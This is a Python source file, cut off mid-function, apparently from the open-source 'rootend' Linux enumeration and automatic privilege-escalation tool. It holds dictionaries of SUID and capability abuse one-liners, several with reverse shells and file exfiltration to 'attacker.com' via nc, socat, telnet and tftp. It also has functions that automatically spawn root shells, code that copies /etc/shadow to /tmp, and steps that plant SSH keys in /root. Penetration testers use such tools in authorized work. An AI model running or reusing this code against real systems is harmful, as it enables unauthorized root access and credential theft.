#!/usr/bin/env python

#Modules area
from __future__ import print_function
from datetime import datetime
from sys import exit,argv
from subprocess import call
import os
import getpass
import socket
import platform
import argparse
import textwrap
import csv
import shutil
import pwd
import grp


"""
    rootend - A *nix Enumerator & Auto Privilege Escalation tool.
    This file is part of rootend Project
    Written by: @nickvourd
    Website: https://www.twelvesec.com/
    GIT: https://github.com/twelvesec/rootend/
    TwelveSec (@Twelvesec)
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    For more see the file 'LICENSE' for copying permission.
"""


#variables area
__author__ = "@nickvourd"
__version__ = "2.0.2"
__license__ = "GPLv3"
__team__ = "@twelvesec"
__systems__ = "*nix"


#lists & arrays  area
__thanks__ = [ '@maldevel', 'servo' ]

defaults = [ "arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec", "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap" ]

suid_for_read = { 'arp': '-> arp -v -f "/root/.ssh/id_rsa"', 'base32': '-> base32 "/root/.ssh/id_rsa" | base32 --decode', 'base64': '-> base64 "/root/.ssh/id_rsa" | base64 --decode', 'cat': '-> cat /root/.ssh/id_rsa', 'cut': '-> cut -d "" -f1 "/root/.ssh/id_rsa"', 'date': '-> date -f "/root/.ssh/id_rsa"', 'dd': '-> dd if="/root/.ssh/id_rsa"', 'dialog': '-> dialog --textbox "/root/.ssh/id_rsa" 0 0', 'diff': '-> diff --line-format=%L /dev/null "/root/.ssh/id_rsa"', 'eqn': '-> eqn "/root/.ssh/id_rsa"', 'expand': '-> expand "/root/.ssh/id_rsa"', 'file': '-> file -f "/root/.ssh/id_rsa"', 'fmt': '-> fmt -999 "/root/.ssh/id_rsa"', 'fold': '-> fold -w99999999 "/root/.ssh/id_rsa"', 'grep': '-> grep "" "/root/.ssh/id_rsa"', 'hd': '-> hd "/root/.ssh/id_rsa"', 'head': '-> head -c1G "/root/.ssh/id_rsa"', 'hexdump': '-> hexdump -C "/root/.ssh/id_rsa"', 'highlight': '-> highlight --no-doc --failsafe "/root/.ssh/id_rsa"', 'iconv': '-> iconv -f 8859_1 -t 8859_1 "/root/.ssh/id_rsa"', 'ip': '-> ip -force -batch "/root/.ssh/id_rsa"', 'jq': '-> jq -Rr . "/root/.ssh/id_rsa"', 'ksshell': '-> ksshell -i "/root/.ssh/id_rsa"', 'less': '-> less "/root/.ssh/id_rsa"', 'look': '-> look "" "/root/.ssh/id_rsa"', 'lwp-request': '-> lwp-request "file://root/.ssh/id_rsa"', 'more': '-> more "/root/.ssh/id_rsa"', 'nl': '-> nl -bn -w1 -s "" "/root/.ssh/id_rsa"', 'od': '-> od -An -c -w9999 "/root/.ssh/id_rsa"', 'pg': '-> pg "/root/.ssh/id_rsa"', 'sed': '-> sed "" "/root/.ssh/id_rsa"', 'soelim': '-> soelim "/root/.ssh/id_rsa"', 'sort': '-> sort -m "/root/.ssh/id_rsa"', 'x86_64-linux-gnu-strings': '-> strings "/root/.ssh/id_rsa"', 'sysctl': '-> sysctl -n "/../../root/.ssh/id_rsa"', 'tac': '-> tac -s "RANDOM" "/root/.ssh/id_rsa"', 'tail': '-> tail -c1G "/root/.ssh/id_rsa"', 'ul': '-> ul "/root/.ssh/id_rsa"', 'unexpand': '-> unexpand -t99999999 "/root/.ssh/id_rsa"', 'uniq': '-> uniq "/root/.ssh/id_rsa"', 'uuencode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode', 'uudecode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode', 'xxd': '-> xxd "/root/.ssh/id_rsa" | xxd -r', 'xz': '-> xz -c "/root/.ssh/id_rsa" | xz -d', 'zsoelim': '-> zsoelim "/root/.ssh/id_rsa"'}

suid_manual = { 'aria2c': '-> COMMAND=\'id\'\n-> TF=$(mktemp)\n-> echo "$COMMAND" > $TF\n-> chmod +x $TF\n\n-> aria2c --on-download-error=$TF http://x', 'restic': '-> RHOST=attacker.com\n-> RPORT=12345\n-> LFILE=file_or_dir_to_get\n-> NAME=backup_name\n\n-> restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"', 'shuf': '-> LFILE=file_to_write\n\n-> shuf -e DATA -o "$LFILE"\n', 'tee': '-> LFILE=file_to_write\n\n-> echo DATA | ./tee -a "$LFILE"'}

suid_manual2 = { 'busybox': '-> busybox sh', 'rpm': '-> rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'', 'rsync': '-> rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null', 'systemctl': '-> TF=$(mktemp).service\n-> echo \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n\n-> systemctl link $TF\n\n-> systemctl enable --now $TF', 'dmsetup': "-> dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n\n-> dmsetup ls --exec '/bin/sh -p -s'", 'emacs-gtk': '-> emacs -Q -nw --eval \'(term "/bin/sh -p")\'', 'gimp-2.10': '-> gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'gtester': '-> TF=$(mktemp)\n-> echo \'#!/bin/sh -p\' > $TF\n-> echo \'exec /bin/sh -p 0<&1\' >> $TF\n-> chmod +x $TF\n\n-> gtester -q $TF', 'make': '-> make -s --eval=$\'x:\\n\\t-\'"/bin/sh -p"', 'nano': '-> nano\n^R^X\nreset; sh 1>&0 2>&0', 'openssl': '-> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n-> openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n', 'perl': '-> perl -e \'exec "/bin/sh";\'', 'pico': '-> pico\n^R^X\nreset; sh 1>&0 2>&0', 'tftp': '-> RHOST=attacker.com\n\n-> tftp $RHOST\n-> put file_to_send', 'vim.basic': '-> vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'', 'watch': '-> watch -x sh -c \'reset; exec sh 1>&0 2>&0\'', }

suid_manual3 = { 'bash': '-> bash -p', 'chroot': '-> chroot / /bin/sh -p', 'bsd-csh': '-> bsd-csh -b', 'dash': '-> dash -p', 'docker': '-> docker run -v /:/mnt --rm -it alpine chroot /mnt sh', 'env': '-> env /bin/sh -p', 'expect':'-> expect -c "spawn /bin/sh -p;interact"', 'find': '-> find . -exec /bin/sh -p \\; -quit', 'flock': '-> flock -u / /bin/sh -p', 'gdb': '-> gdb -q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit', 'ionice':'-> ionice /bin/sh -p', 'ksh2020':'-> ksh -p', 'ld.so':'-> ld.so /bin/sh -p', 'logsave': '-> logsave /dev/null /bin/sh -i -p', 'nice': '-> nice /bin/sh -p', 'node':'-> node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'', 'nohup': '-> nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"', 'php7.4': '-> php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"', 'python2.7': '-> python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'python3.8': '-> python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'rlwrap':'-> rlwrap -H /dev/null /bin/sh -p', 'run-part': '-> run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'', 'setarch': '-> setarch $(arch) /bin/sh -p', 'start-stop-daemon': '-> start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p', 'stdbuf': '-> stdbuf -i0 /bin/sh -p', 'strace': '-> strace -o /dev/null /bin/sh -p', 'taskset': '-> taskset 1 /bin/sh -p', 'time': '-> time /bin/sh -p', 'timeout': '-> timeout 7s /bin/sh -p', 'unshare': '-> unshare -r /bin/sh', 'xargs': '-> xargs -a /dev/null sh -p', 'zsh': '-> zsh' }

suid_mody = [ "cp", "mv" ]

suid_mody2 = [ "chmod", "chown" ]

suid_download = [ "curl", "wget", "lwp-download" ]

suid_lim = { 'awk': '-> awk \'BEGIN {system("/bin/sh")}\'', 'byebug': '-> TF=$(mktemp)\n -> echo \'system("/bin/sh")\' > $TF\n\n-> byebug $TF\n-> continue','ed': '-> ed\n!/bin/sh', 'gawk': '-> gawk \'BEGIN {system("/bin/sh")}\'', 'git': '-> PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help', 'iftop': '-> iftop\n!/bin/sh', 'ldconfig': '-> TF=$(mktemp -d)\n-> echo "$TF" > "$TF/conf"\n\n-> ldconfig -f "$TF/conf"', 'lua': '-> lua -e \'os.execute("/bin/sh")\'', 'mawk': '-> mawk \'BEGIN {system("/bin/sh")}\'', 'mysql': "-> mysql -e '\\! /bin/sh'", 'nawk': '-> nawk \'BEGIN {system("/bin/sh")}\'', 'nc': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> nc -e /bin/sh $RHOST $RPORT', 'nmap': '-> TF=$(mktemp)\n-> echo \'os.execute("/bin/sh")\' > $TF\n\n-> nmap --script=$TF', 'pic': '-> pic -U\n.PS\nsh X sh X', 'pry': '-> pry\nsystem("/bin/sh")', 'rvim': '-> rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'', 'scp': '-> TF=$(mktemp)\n-> echo \'sh 0<&2 1>&2\' > $TF\n-> chmod +x "$TF"\n\n-> scp -S $TF a b:', 'socat': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane', 'sqlite3': "-> sqlite3 /dev/null '.shell /bin/sh'", 'tar': '-> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'telnet': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> telnet $RHOST $RPORT\n^]\n!/bin/sh', 'zip': "-> TF=$(mktemp -u)\n\n-> zip $TF /etc/hosts -T -TT 'sh #'\n-> sudo rm $TF" }

suid_exec = [ "bash", "chroot", "bsd-csh", "dash", "docker", "env", "expect", "find", "flock", "gdb", "ionice", "ksh2020", "ld.so", "logsave", "nice", "node", "nohup", "php7.4", "python2.7", "python3.8", "rlwrap", "run-parts", "setarch", "start-stop-daemon", "stdbuf", "strace", "taskset", "time", "timeout", "unshare", "xargs", "zsh" ]

php_files = [ "wp-config.php", "config.php", "connect.php", "wp-config.php", "configuration.php", "settings.php", "database.php", "db.php", "db_conn.php", "wp-config-sample.php" ]

php_files2 = []

redis_lines = []

capa_default = [ "mtr-packet", "gnome-keyring-daemon", "ping", "fping", "traceroute6.iputils", "gst-ptp-helper" ]

capa_exec = { "gdb": "-> gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit\n", "node":"-> node -e 'process.setuid(0); require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]});'\n", "perl":"-> perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec '/bin/sh';'\n", "php":"-> php -r 'posix_setuid(0); system('/bin/sh');\n", "ruby":"-> ruby -e 'Process::Sys.setuid(0); exec '/bin/sh''\n" }

write_array = []


#ascii art
message = '''
___________              .__                _________              
\__    ___/_  _  __ ____ |  |___  __ ____  /   _____/ ____   ____  
  |    |  \ \/ \/ // __ \|  |\  \/ // __ \ \_____  \_/ __ \_/ ___\ 
  |    |   \     /\  ___/|  |_\   /\  ___/ /        \  ___/\  \___ 
  |____|    \/\_/  \___  >____/\_/  \___  >_______  /\___  >\___  >
                       \/               \/        \/     \/     \/ 
rootend v.{} - Enumeration & Automation Privilege Escalation tool.
rootend is an open source tool licensed under {}.
Affected systems: {}.
Written by: {} of {}.
Special thanks to {} & {}.
https://www.twelvesec.com/
Please visit https://github.com/twelvesec/rootend for more..
'''.format(__version__, __license__, __systems__, __author__, __team__, __thanks__[0], __thanks__[1])


#classes area
class Bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ORANGE = '\033[33m'


class Nocolors:
    OKBLUE = '\033[37m'
    OKGREEN = '\033[37m'
    WARNING = '\033[37m'
    FAIL = '\033[37m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ORANGE = '\033[37m'


class User:
    def __init__(self):
        self.name = getpass.getuser()
        try:
            from pathlib import Path
            self.home = str(Path.home())
        except:
            self.home = os.path.expanduser("~")

        self.user = os.geteuid()
        self.group = os.getegid()
        self.real = os.getgid()
        self.list = os.getgroups()
        self.shell = os.environ['SHELL']


class Victim:
    def __init__(self):
        self.host = socket.gethostname()
        try:
            self.distro = platform.linux_distribution()
        except:
            import distro
            self.distro = distro.linux_distribution()

        self.arch = platform.architecture()[0]
        self.pross = platform.processor()
        self.kernel = platform.release()


#functions area

#argements function
def arguments(argv):

    #sets args menu
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''\
            usage examples:
              ./rootend.py -a
              ./rootend.py -m
              ./rootend.py -v
              ./rootend.py -b

            Specific categories usage examples:
              ./rootend.py -a -s
              ./rootend.py -m -w
              ./rootend.py -a -s -p
              ./rootend.py -m -w -c -p
              ./rootend.py -a -s -c -p -f

              *Use the above arguments with -n to disable color.
              '''))

    parser.add_argument("-v", "--version", action='store_true', dest='version', help="show version and exit")
    parser.add_argument("-a", "--auto", action='store_true', dest='auto', help="automated privilege escalation process")
    parser.add_argument("-m", "--manual", action='store_true', dest='manual', help="system enumeration") 
    parser.add_argument("-n", "--nocolor", action='store_true', dest='color', help="disable color")
    parser.add_argument("-b", "--banner", action='store_true', dest='banner', help="show banner and exit")
    parser.add_argument("-s", "--suid", action='store_true', dest='suid', help="suid binary enumeration")
    parser.add_argument("-w", "--weak", action='store_true', dest='weak', help="weak permissions of files enumeration")
    parser.add_argument("-p", "--php", action='store_true', dest='php', help="PHP configuration files enumeration")
    #parser.add_argument("-k", "--kernel", action='store_true', dest='kernel', help="Kernel exploits suggestion")
    parser.add_argument("-c", "--capabilities", action='store_true', dest='capa', help="capabilities enumeration")
    parser.add_argument("-f", "--full-writables", action='store_true', dest='full', help="world writable files enumeration")
    #parser.add_argument("-d", "--containers", action='store_true', dest='container', help="containers enumeration") 
    args = parser.parse_args()

    #check the number of arguments 
    if len(argv) == 1: 
        print(message)
        parser.print_help() 
        exit()
    
    return args


#check_4_args function 
def check_4_args(args): 
    arg_flag = "nothing" 
    if args.version and not args.manual: 
        if args.version and not args.auto: 
            if args.version and not args.banner: 
                if args.version and not args.suid: 
                    if args.version and not args.weak: 
                        if args.version and not args.php: 
                            if args.version and not args.capa: 
                                if args.version and not args.full: 
                                    arg_flag = "version" 
    elif args.manual and not args.version: 
        if args.manual and not args.auto: 
            if args.manual and not args.banner: 
                arg_flag = "manual"
    elif args.auto and not args.version: 
        if args.auto and not args.manual: 
            if args.auto and not args.banner: 
                arg_flag = "auto" 
    elif args.banner and not args.version: 
        if args.banner and not args.auto: 
            if args.banner and not args.manual: 
                if args.banner and not args.suid: 
                    if args.banner and not args.weak: 
                        if args.banner and not args.php: 
                            if args.banner and not args.capa:
                                if args.banner and not args.full: 
                                    arg_flag = "banner"
                                            
    return arg_flag


#check_4_args2 function 
def check_4_args2(args, argv): 
    arg_flag = "nothing"
    
    if len(argv) == 2: 
        if args.auto or args.manual: 
            arg_flag = "all" 
    elif len(argv) == 3: 
        if (args.auto and args.color) or (args.manual and args.color): 
            arg_flag = "all"

    return arg_flag


#test_date function 
def test_date(): 
    now = datetime.now() 
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

    return dt_string


#find_whoami function 
def find_whoami(user, user_id, group_id, real_id, other_groups, home, shell, bold, blue, warning, fail, endc): 
    print(bold + blue + '[+] User:\n\n' + endc + user + '\n\n') 
    if user != "root": 
        print(bold + blue + '[+] ' + user + ' Details:\n' + endc) 
        print(warning + 'User id: ' + endc + str(user_id) + warning + '\nGroup id: ' + endc  + str(group_id) + warning + '\nReal id: ' + endc + str(real_id) + '\n' + warning + 'Supplemental groups: ' + endc + str(other_groups)) 
        print(warning + 'Home directory: ' + endc + home) 
        print(warning + 'Type of shell: ' + endc + shell + '\n') 
    else:
        print(bold + blue + '[+] ' + user + ' Details:\n' + endc) 
        call(["id"]) 
        print('\n') 
        print( bold + fail + '[!] You are already root!' + endc + '\n') 
        exit()


#find_victim function 
def find_victim(bold, blue, warning, endc, host, distro, kernel, pross, arch): 
    print(bold + blue + '\n[+] Victim:\n\n' + endc + host + '\n\n') 
    print(bold + blue + '[+] ' + host + ' Details:\n' + endc)
    print(warning + 'Distribution: ' + endc + distro[0]) 
    print(warning + 'Version: ' + endc + distro[1]) 
    print(warning + 'Nickname: ' + endc + distro[2])
    print(warning + 'Kernel Version: ' + endc + kernel) 
    print(warning + 'Processor: ' + endc  + pross) 
    print(warning + 'Architecture: ' + endc  + arch + '\n')


#ip_msg function
def ip_msg(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> The following example only works for Linux with CONFIG_NET_NS=y and you can take root's privileges.\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)
    print(bold + "-> ip netns add foo\n" + endc)
    print(bold + "-> ip netns exec foo /bin/sh -p\n" + endc)
    print(bold + "-> ip netns delete foo\n\n" + endc)


#root_msg function
def root_msg(bold, green, endc):
    print(bold + green + "[!] Shell Opened! You are root now! :)\n" + endc)


#important_msg function
def important_msg(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Run the following command and read files from root!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)


#important_msg2 function
def important_msg2(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Follow the below example and create files with root's permissions/ownership!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)


#important_msg3 function
def important_msg3(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Maybe not sure, you can try to follow the below example and take root's privileges!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)


#important_msg5 function
def important_msg5(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> If capability setted CAP_SETUID, you can use the following example...\n" + endc)
    print(bold + blue + "[!] Example:\n" + endc)


#important_msg6 function
def important_msg6(bold, green, blue, fail, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Visit the below link and find the exploit!\n" + endc)
    print(bold + blue + "[*] Link:\n" + endc)


#important_msg7 function
def important_msg7(bold, blue, warning, endc): 
    print(bold + blue + "[!] Advice:\n" +endc)
    print(bold + warning + "-> Maybe, Not Sure! Use the following capability example and take root's privileges\n" + endc)
    print(bold + blue + "[!] Example:\n" + endc)


#banner_msg function
def banner_msg(filename, bold, green, endc):
    print(bold + green + "[!] Found weak permissions of {} file".format(filename) + endc + '\n')


#banner_msg2 function
def banner_msg2(filename, bold, green, endc):
    print(bold + green + "[!] Found ownership misconfiguration of {} file".format(filename) + endc + '\n')


#banner_msg3 function
def banner_msg3(filename, bold, green, endc):
    print(bold + green + "[!] Found group misconfiguration of {} file".format(filename) + endc + '\n')


#banner_msg4 function
def banner_msg4(filename, bold, warning, endc):
    print(bold + warning + "[!] Access in " + filename + '\n' + endc) 


#banner_msg5 function 
def banner_msg5(filename, bold, green, endc): 
    print(bold + green + "\n[!] Found php configuration file:\n\n" + endc + filename + "\n")


#banner_msg6 function
def banner_msg6(filename, bold, green, endc):
    print(bold + green + "[!] Found weak permissions of {} directory\n".format(filename) + endc)


#banner_msg7 funtion
def banner_msg7(filename, flag, bold, blue, warning, endc, orange):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Read the {} file and try to crack any hash in order to take root's privileges!\n".format(filename) + endc)
    if flag == "manual":
        print(bold + blue + "[*] Example:\n" + endc)
    else:
        if filename == "/etc/shadow":
            #call function named copy_shadow
            copy_shadow(filename, bold, blue, warning, endc, orange)


#banner_msg8 function
def banner_msg8(filename, bold, green, endc):
    print(bold + green + "[!] Found ownership misconfiguration of {} directory".format(filename) + endc + '\n')


#banner_msg9 function
def banner_msg9(filename, bold, green, endc):
    print(bold + green + "[!] Found group misconfiguration of {} directory".format(filename) + endc + '\n')


#banner_msg10 function
def banner_msg10(filename, bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Maybe not Sure, Visit the below link and edit {} file in order to take root's privileges\n" + endc)
    print(bold + blue + "[~] Link:\n" + endc)


#copy_shadow function
def copy_shadow(filename, bold, blue, warning, endc, orange):
    shutil.copyfile('/etc/shadow', '/tmp/shadow')
    filename2 = "/tmp/shadow"
    print(bold + orange + "[!] {} file copied to {}\n".format(filename, filename2) + endc)
    print(bold + "-> cat /tmp/shadow\n" + endc)


#readelf_msg function
def readelf_msg(bold, blue, warning, endc):
    print(bold + blue + "[*] Important Notice:\n" + endc)
    print(bold + warning + "-> readelf is a tool which displays information about elf files! You can use it only for elf files...\n" + endc)


#job_finish function 
def job_finish(flag, bold, blue, green, endc): 
    if flag == "auto": 
        color = green 
    else: 
        color = blue

    print(bold + color + '[!] Scanning finished...' + endc) 
    exit()


#exim_priv_esc function
def exim_priv_esc(bold, green, blue, fail, warning, endc):
    #call function named important_msg6
    important_msg6(bold, green, blue, fail, warning, endc)
    print(bold + warning + '-> https://www.exploit-db.com/exploits/46996\n\n' + endc)


#curl_path function
def curl_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use curl to download keys into /root:" + endc)
    print("         curl -o /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#wget_path function
def wget_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use wget to download keys into /root:" + endc)
    print("         wget -O /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#lwp_path function
def lwp_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use lwp-download to download keys into /root:" + endc)
    print("         lwp-download http://<your_ip>:<your_port>/id_rsa.pub /root/.ssh/authorized_keys\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#curl_priv_esc function
def curl_priv_esc(bold, blue, warning, endc):
    #call function named important_msg3
    important_msg3(bold, blue, warning, endc)

    #call function named curl_path
    curl_path(bold, blue, warning, endc)


#wget_priv_esc function
def wget_priv_esc(bold, blue, warning, endc):
    #call function named important_msg3
    important_msg3(bold, blue, warning, endc)

    #call function named wget_path
    wget_path(bold, blue, warning, endc)


#lwp_download_priv_esc function
def lwp_downlaod_priv_esc(bold, blue, warning, endc):
    #call function named important_msg3
    important_msg3(bold, blue, warning, endc)

    #call function named lwp_path
    lwp_path(bold, blue, warning, endc)


#rake_priv_esc function
def rake_priv_esc(bold, blue, warning, endc):
    #call function named important_msg3
    important_msg3(bold, blue, warning, endc)
    command = '''-> rake -p '`/bin/sh 1>&0`'
    '''
    print(command + '\n')


#readelf_priv_esc function
def readelf_priv_esc(bold, blue, warning, endc):
    #call function named readlef_msg
    readelf_msg(bold, blue, warning, endc)
    print(bold + blue + "[*] Example:\n" + endc)
    print('-> lfile=file_to_read\n')
    print('-> readelf -a @$lfile\n\n')


#bash_priv_esc function
def bash_priv_esc():
    call(["bash","-p"])


#chroot_priv_esc function
def chroot_priv_esc():
    call(["chroot","/","/bin/sh","-p"])


#csh_priv_esc function
def csh_priv_esc():
    call(["csh","-b"])


#dash_priv_esc function
def dash_priv_esc():
    call(["dash","-p"])


#docker_priv_esc functionn
def docker_priv_esc():
    call(["docker","run","-v","/:/mnt","--rm","-it","alpine","chroot","/mnt","sh"])


#env_priv_esc function
def env_priv_esc():
    call(["env","/bin/sh","-p"])


#expect_priv_esc function
def expect_priv_esc():
    os.system('expect -c "spawn /bin/sh -p;interact"')


#find_priv_esc function
def find_priv_esc():
    os.system('find . -exec /bin/sh -p \; -quit')


#flock_priv_esc function
def flock_priv_esc():
    call(["flock","-u","/","/bin/sh","-p"])


#gdb_priv_esc function
def gdb_priv_esc():
    command = '''
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    '''
    os.system(command)


#ionice_priv_esc function
def ionice_priv_esc():
    call(["ionice","/bin/sh","-p"])


#ksh_priv_esc function
def ksh_priv_esc():
    call(["ksh","-p"])


#ld_so_priv_esc funtion
def ld_so_priv_esc():
    call(["ld.so","/bin/sh","-p"])


#logsave_priv_esc function
def logsave_priv_esc():
    call(["logsave","/dev/null","/bin/sh","-i","-p"])


#nice_priv_esc function
def nice_priv_esc():
    call(["nice","/bin/sh","-p"])


#node_priv_esc function
def node_priv_esc():
    command='''
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
    '''
    os.system(command)


#nohup_priv_esc function
def nohup_priv_esc():
    command='''
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
    '''
    os.system(command)


#php_priv_esc function
def php_priv_esc():
    command = '''
php -r "pcntl_exec('/bin/sh', ['-p']);"
    '''
    os.system(command)


#python_priv_esc function
def python_priv_esc():
    command = '''
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    os.system(command)


#python3_priv_esc function
def python3_priv_esc():
    command = '''
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    os.system(command)


#rlwrap_priv_esc function
def rlwrap_priv_esc():
    call(["rlwrap","-H","/dev/null","/bin/sh","-p"])


#run_parts_priv_esc function
def run_parts_priv_esc():
    command = '''
run-parts --new-session --regex '^sh$' /bin --arg='-p'
    '''
    os.system(command)


#setarch_priv_esc function
def setarch_priv_esc():
    os.system('setarch $(arch) /bin/sh -p')


#start_stop_daemon_priv_esc function
def start_stop_daemon_priv_esc():
    command = '''
start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p
    '''
    os.system(command)


#stdbuf_priv_esc function
def stdbuf_priv_esc():
    call(["stdbuf","-i0","/bin/sh","-p"])


#strace_priv_esc function
def strace_priv_esc():
    call(["strace","-o","/dev/null","/bin/sh","-p"])


#taskset_priv_esc function
def taskset_priv_esc():
    call(["taskset","1","/bin/sh","-p"])


#time_priv_esc function
def time_priv_esc():
    call(["time","/bin/sh","-p"])


#timeout_priv_esc function
def timeout_priv_esc():
    os.system('timeout 7s /bin/sh -p')


#unshare_priv_esc function
def unshare_priv_esc():
    call(["unshare","-r","/bin/sh"])


#xargs_priv_esc function
def xargs_priv_esc():
    call(["xargs","-a","/dev/null","sh","-p"])


#zsh_priv_esc function
def zsh_priv_esc():
    call(["zsh"])


#config_msg function
def config_msg(bold, blue, warning, endc):
    print(bold + warning + "[!] Try to configure /etc/passwd file...\n" + endc)
    print(bold + warning + "[!] Try to create a new user...\n" + endc)
   

#config_msg2 function
def config_msg2(filename, bold, blue, warning, endc):
    print(bold + blue + '[+] Advice:\n' + endc)
    print(bold + warning + "-> Follow the below example in order to edit the {} file and take root's privileges\n".format(filename) + endc)
    print(bold + blue + '[*] Example:\n' + endc)


#other_msg function
def other_msg(flag, bold, green, blue, warning, endc):
    if flag != 'manual':
        print(bold + green + "[!] Done! Use the following credentials in order to take root's privileges!\n" + endc)
    
    print(bold + warning + " -> Credentials:\n" + endc)
    print(bold + blue + "------------------------------" + endc)
    print(bold + blue + "|   Username  |   Password   |" + endc)
    print(bold + blue + "------------------------------" + endc)
    print(bold + blue + "| " + bold + green+ " superuser" + bold + blue + "  | " + bold + green + "password1234" + bold + blue + " |" + endc)
    print(bold + blue + "------------------------------\n" + endc)


#cp_priv_esc function
def cp_priv_esc(flag, bold, green, blue, warning, endc):
